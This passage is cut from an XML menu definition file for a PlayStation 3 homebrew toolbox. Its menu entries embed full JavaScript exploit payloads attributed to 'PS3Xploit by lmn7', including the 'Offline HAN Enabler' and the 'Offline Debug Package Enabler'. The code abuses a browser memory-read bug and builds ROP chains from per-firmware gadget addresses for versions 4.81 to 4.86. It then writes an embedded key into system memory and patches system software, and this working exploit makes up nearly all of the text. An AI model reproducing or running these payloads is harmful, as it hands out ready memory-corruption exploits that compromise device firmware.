(")+19,ua.indexOf(") Apple")),ipf1_addr=0x6ebb70,ipf2_addr=0x507374;document.write(\047\074html\076\074head\076\074title\076PS3Xploit - Offline HAN Enabler by lmn7\074/title\076\074/head\076\074body id="bodyId" style="background-color:#FFFFFF"\076\074div id="headerId"\076\074h1\076Enabling HAN for CEX...\074/h1\076\074span id="hideme" style="visibility:hidden"\076\074p\076\074button id="btnROP" type="button" onclick="initROP(true);" autofocus\076Initialize\074/button\076 | Close \074input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\076\074span id="dex_txt" style="visibility:hidden"\076\074input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\076\074/span\076\074/p\076\074p\076\074button id="btnTrigger" disabled="" type="button" onclick="triggerX();"\076En\074/button\076\074span id="reset" style="visibility:hidden"\076 | \074button id="btnReset" type="button" onclick="disable_trigger();"\076Reset\074/button\076\074/span\076\074/p\076\074/span\076\074div id="exploit" \076\074/div\076\074div id="trigger"\076\074/div\076\074/body\076\074/html\076\047); var toc_addr=7296344, default_vsh_pub_toc=7263660, vsh_opd_patch=617820, vsh_opd_addr=7256944, vsh_ps3xploit_key_toc=7370860, toc_entry1_addr=7185360, toc_entry2_addr=7494456, toc_entry3_addr=7185352, toc_entry4_addr=7602176, toc_entry5_addr=7255752, toc_entry6_addr=0, gadget1_addr=620036, gadget2_addr=6332644, gadget3_addr=872540, gadget4_addr=2267192, gadget5_addr=1227548, gadget6_addr=6380764, gadget7_addr=131024, gadget8_addr=131072, gadget_mod1_addr=6352856, gadget_mod2_addr=80756, gadget_mod3_addr=757248, gadget_mod4a_addr=890500, gadget_mod7_addr=108204, gadget_mod8_addr=2862264, ipf1_addr=7256944, ipf2_addr=5272436; if (fwv=="4.81") { var toc_addr=7296288, default_vsh_pub_toc=7263604, vsh_ps3xploit_key_toc=7369532,toc_entry2_addr=7493128,toc_entry5_addr=7255696,gadget2_addr=6330024,gadget6_addr=6378144,gadget_mod1_addr=6350236,gadget_mod8_addr=2862260 } else if (fwv=="4.82") { var toc_addr=7296336, default_vsh_pub_toc=7263652,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry2_addr=7494200,toc_entry5_addr=7255744,gadget2_addr=6332484,gadget6_addr=6380604,gadget_mod1_addr=6352696 } else if (fwv=="4.83") { var ipf1_addr=7256952 } else if (fwv=="4.84" || fwv=="4.85") { var ipf1_addr=7256952 } else if (fwv=="4.86") { var vsh_ps3xploit_key_toc=7371292,toc_entry2_addr=7494888, ipf1_addr=0,ipf2_addr=0 } function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\076\07616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\0470000\047+this).substr(-4)};String.prototype.toAscii=function(a){var b=\047\047;var i=0;while(i\074this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\0741){return\047\047}var b=\047\047;var c=\047\047;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}while(i\074b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\047\047)};String.prototype.convertedSize=function(a){if(this.length\0741){return 0}var b=\047\047;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\047\047,sign=this\0740?\047-\047:\047\047,str=a[0].replace(\047.\047,\047\047),mag=Number(a[1])+1;if(mag\0740){z=sign+\0470.\047;while(mag++){z+=\0470\047}return z+str.replace(/^\-/,\047\047)}mag-=str.length;while(mag--){z+=\0470\047}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\076\0761}}g.reverse();var k=g.join(\047\047);var l=(1\074\074(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\074\074b)-1){d=f!==0?NaN:s*Infinity}else if(e\0760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\076\07624)&0xFF,(a\076\07616)&0xFF,(a\076\0768)&0xFF,(a)&0xFF,(b\076\07624)&0xFF,(b\076\07616)&0xFF,(b\076\0768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\074\07432)|((b\076\0761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\047exploit\047)){document.getElementById(\047exploit\047).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\047exploit\047)){readMemory(a,b);if(debug===true){var x=document.getElementById(\047exploit\047).style.src.substr(6,c);return x}return document.getElementById(\047exploit\047).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\047trigger\047)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){var b=document.getElementById(\047auto_close\047);if(b){if(b.checked===true)window.close()}}function load_check(){if(total_loops\074max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\047exploit\047).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\074(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\074(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\074offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+ps3xploit_ecdsa_key.convert(true)+index_key.convert(true)+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\074search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}ps3xploit_ecdsa_key_addr=xtra_data_addr+start_x.convertedSize()-0x4;index_key_addr=ps3xploit_ecdsa_key_addr+ps3xploit_ecdsa_key.convertedSize(true);stack_frame=stack_frame_hookup()+store_word(toc_entry1_addr,vsh_opd_patch+4)+store_word(toc_entry3_addr,vsh_opd_patch+4)+store_word(toc_entry5_addr,vsh_opd_patch+4)+store_word(ipf1_addr,ipf2_addr)+store_word(default_vsh_pub_toc,vsh_ps3xploit_key_toc)+memcpy(vsh_ps3xploit_key_toc-0x20,index_key_addr,(index_key.length/2))+memcpy(vsh_ps3xploit_key_toc,ps3xploit_ecdsa_key_addr,(ps3xploit_ecdsa_key.length/2))+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\074search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\074search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){debug=true;debug=false}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
			</Table>
			<Table key="han_debug_auto_offline">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/net_pkg.png</String></Pair>
				<Pair key="title"><String>Offline Debug Package Enabler</String></Pair>
				<Pair key="info"><String>Enable modified retail packages</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,hr="\074hr\076",ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple"));document.write(\047\074html\076\074head\076\074title\076PS3Xploit - Offline Debug Package Enabler by lmn7\074/title\076\074/head\076\074body id="bodyId" style="background-color:#FFFFFF"\076\074div id="headerId"\076\074h1\076Enabling Debug Packages for CEX...\074/h1\076\074span id="hideme" style="visibility:hidden"\076\074p\076\074button id="btnROP" type="button" onclick="initROP(true);" autofocus\076Initialize\074/button\076 | Close \074input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\076\074span id="dex_txt" style="visibility:hidden"\076\074input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\076\074/span\076\074/p\076\074p\076\074button id="btnTrigger" disabled="" type="button" onclick="triggerX();"\076En\074/button\076\074span id="reset" style="visibility:hidden"\076 | \074button id="btnReset" type="button" onclick="disable_trigger();"\076Reset\074/button\076\074/span\076\074/p\076\074/span\076\074div id="exploit" \076\074/div\076\074div id="trigger"\076\074/div\076\074/body\076\074/html\076\047); var toc_addr=7296344, default_vsh_pub_toc=7263660, vsh_opd_patch=617820, vsh_opd_addr=7256944, vsh_ps3xploit_key_toc=7370860, toc_entry1_addr=7185360, toc_entry2_addr=7494456, toc_entry3_addr=7185352, toc_entry4_addr=7602176, toc_entry5_addr=7255752, toc_entry6_addr=0, gadget1_addr=620036, gadget2_addr=6332644, gadget3_addr=872540, gadget4_addr=2267192, gadget5_addr=1227548, gadget6_addr=6380764, gadget7_addr=131024, gadget8_addr=131072, gadget_mod1_addr=6352856, gadget_mod2_addr=80756, gadget_mod3_addr=757248, gadget_mod4a_addr=890500, gadget_mod7_addr=108204, gadget_mod8_addr=2862264, ipf1_addr=7256944, ipf2_addr=5272436; if (fwv=="4.81") { var toc_addr=7296288, default_vsh_pub_toc=7263604, vsh_ps3xploit_key_toc=7369532,toc_entry2_addr=7493128,toc_entry5_addr=7255696,gadget2_addr=6330024,gadget6_addr=6378144,gadget_mod1_addr=6350236,gadget_mod8_addr=2862260 } else if (fwv=="4.82") { var toc_addr=7296336, default_vsh_pub_toc=7263652,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry2_addr=7494200,toc_entry5_addr=7255744,gadget2_addr=6332484,gadget6_addr=6380604,gadget_mod1_addr=6352696 } else if (fwv=="4.83") { var ipf1_addr=7256952 } else if (fwv=="4.84" || fwv=="4.85") { var ipf1_addr=7256952 } else if (fwv=="4.86") { var vsh_ps3xploit_key_toc=7371292,toc_entry2_addr=7494888, ipf1_addr=0,ipf2_addr=0 } function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\076\07616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\0470000\047+this).substr(-4)};String.prototype.toAscii=function(a){var b=\047\047;var i=0;while(i\074this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\0741){return\047\047}var b=\047\047;var c=\047\047;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}while(i\074b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\047\047)};String.prototype.convertedSize=function(a){if(this.length\0741){return 0}var b=\047\047;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\047\047,sign=this\0740?\047-\047:\047\047,str=a[0].replace(\047.\047,\047\047),mag=Number(a[1])+1;if(mag\0740){z=sign+\0470.\047;while(mag++){z+=\0470\047}return z+str.replace(/^\-/,\047\047)}mag-=str.length;while(mag--){z+=\0470\047}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\076\0761}}g.reverse();var k=g.join(\047\047);var l=(1\074\074(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\074\074b)-1){d=f!==0?NaN:s*Infinity}else if(e\0760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\076\07624)&0xFF,(a\076\07616)&0xFF,(a\076\0768)&0xFF,(a)&0xFF,(b\076\07624)&0xFF,(b\076\07616)&0xFF,(b\076\0768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\074\07432)|((b\076\0761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\047exploit\047)){document.getElementById(\047exploit\047).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\047exploit\047)){readMemory(a,b);if(debug===true){var x=document.getElementById(\047exploit\047).style.src.substr(6,c);return x}return document.getElementById(\047exploit\047).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\047trigger\047)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){var b=document.getElementById(\047auto_close\047);if(b){if(b.checked===true)window.close()}}function load_check(){if(total_loops\074max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\047exploit\047).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\074(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\074(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\074offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\074search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}stack_frame=stack_frame_hookup()+store_word(vsh_opd_addr,vsh_opd_patch)+store_word(ipf1_addr,ipf2_addr)+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\074search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\074search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){debug=true;debug=false}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
			</Table>
		</Attributes>
		<Items>
			<Query 
				class="type:x-xmb/module-action"
				key="han_reboot_hard_auto_offline"
				attr="han_reboot_hard_auto_offline"
				/>
			<Query 
				class="type:x-xmb/module-action"
				key="han_reboot_soft_auto_offline"
				attr="han_reboot_soft_auto_offline"
				/>
			<Query 
				class="type:x-xmb/module-action"
				key="han_shutdown_auto"
				attr="han_shutdown_auto"
				/>
			<Query 
				class="type:x-xmb/module-action"
				key="han_enabler_auto_offline"
				attr="han_enabler_auto_offline"
				/>
			<Query 
				class="type:x-xmb/module-action"
				key="han_debug_auto_offline"
				attr="han_debug_auto_offline"
				/>
		</Items>
	</View>
	
<!-- Main Items > HAN functions (online DEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
		
	<View id="han_functions_dex_main_offline">
		<Attributes>
			<Table key="han_reboot_hard_auto_dex_offline">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/reboot.png</String></Pair>
				<Pair key="title"><String>Offline Hard Rebooter</String></Pair>
				<Pair key="info"><String>Restart console</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2 * mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,hr="\74hr\76",sc_sm_shutdown=0x17B,hard_reboot=0x1200,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (") + 19,ua.indexOf(") Apple"));document.write(\047\074html\076\074head\076\074title\076PS3Xploit - Offline Hard Rebooter by lmn7\074/title\076\074/head\076\074body id="bodyId" style="background-color:#FFFFFF"\076\074div id="headerId"\076\074h1\076Hard Rebooting for DEX...\074/h1\076\074span id="hideme" style="visibility:hidden"\076\074p\076\074button id="btnROP" type="button" onclick="initROP(true);" autofocus\076Initialize\074/button\076 | Close \074input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\076\074span id="dex_txt" style="visibility:hidden"\076\074input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\076\074/span\076\074/p\076\074p\076\074button id="btnTrigger" disabled="" type="button" 